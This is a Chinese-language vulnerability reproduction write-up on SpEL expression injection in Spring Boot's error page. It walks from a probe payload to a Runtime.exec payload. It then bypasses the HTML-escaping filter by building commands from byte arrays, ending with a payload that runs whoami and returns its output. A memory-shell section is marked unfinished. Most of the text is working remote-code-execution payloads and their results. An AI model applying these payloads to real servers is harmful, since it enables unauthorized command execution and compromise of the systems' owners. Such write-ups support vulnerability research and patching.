
#### 漏洞复现

payload-算术表达式
```
id=${1011+1011}
```
![image](https://user-images.githubusercontent.com/55024146/158839423-9045a29c-e31d-46e7-83ef-136caab0dc4a.png)

可见表达式被成功解析

payload-计算器
```
id=${T(java.lang.Runtime).getRuntime().exec("calc")}
```
失败，抛出异常如下

![image](https://user-images.githubusercontent.com/55024146/158841307-e68e7c5c-2ee7-4ca0-834d-10de59a227e6.png)


debug、看源码发现，在进行SpEL解析前，有以下处理
```
convertToReference:133, HtmlCharacterEntityReferences (org.springframework.web.util)
htmlEscape:90, HtmlUtils (org.springframework.web.util)
htmlEscape:63, HtmlUtils (org.springframework.web.util)
resolvePlaceholder:218, ErrorMvcAutoConfiguration$SpelPlaceholderResolver (org.springframework.boot.autoconfigure.web)
parseStringValue:147, PropertyPlaceholderHelper (org.springframework.util)
replacePlaceholders:126, PropertyPlaceholderHelper (org.springframework.util)
render:194, ErrorMvcAutoConfiguration$SpelView (org.springframework.boot.autoconfigure.web)
render:1244, DispatcherServlet (org.springframework.web.servlet)
processDispatchResult:1027, DispatcherServlet (org.springframework.web.servlet)
doDispatch:971, DispatcherServlet (org.springframework.web.servlet)
doService:893, DispatcherServlet (org.springframework.web.servlet)
processRequest:970, FrameworkServlet (org.springframework.web.servlet)
doPost:872, FrameworkServlet (org.springframework.web.servlet)
service:648, HttpServlet (javax.servlet.http)
service:846, FrameworkServlet (org.springframework.web.servlet)
service:729, HttpServlet (javax.servlet.http)
...
```

![image](https://user-images.githubusercontent.com/55024146/158843615-71270054-7003-4c7e-8b1d-ad041bdfd0af.png)

对单引号、双引号、尖括号、&进行了HTML实体编码

![image](https://user-images.githubusercontent.com/55024146/158844001-1031b338-e458-4017-b7a4-44d9017600aa.png)

如图，此时传入的payload中双引号已被编码，则不再符合SpEL表达式的语法，自然也就没法成功利用。

![image](https://user-images.githubusercontent.com/55024146/158845997-16e846c5-906f-4c00-9112-92ba85abe6b4.png)

绕过：不出现单双引号
> 利用String类的特性：将byte型数组转为字符串串对象

![image](https://user-images.githubusercontent.com/55024146/158849319-16a3c8ec-6f79-4f85-bca5-15e5b1463258.png)

```
id=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))}
```
![image](https://user-images.githubusercontent.com/55024146/158850107-fabff113-b042-4e4b-8efd-eb668cd844f3.png)

测试效果

![image](https://user-images.githubusercontent.com/55024146/158850307-2077f252-0e4f-4972-b158-ce1821db3c1f.png)

#### 漏洞利用

##### 回显
```
(new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A").next()
```

```
id=${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{119,104,111,97,109,105})).getInputStream()))}
```
![image](https://user-images.githubusercontent.com/55024146/158853617-24cd3b1c-3f40-474b-9389-befca11d242c.png)

##### 内存马

> 待完成




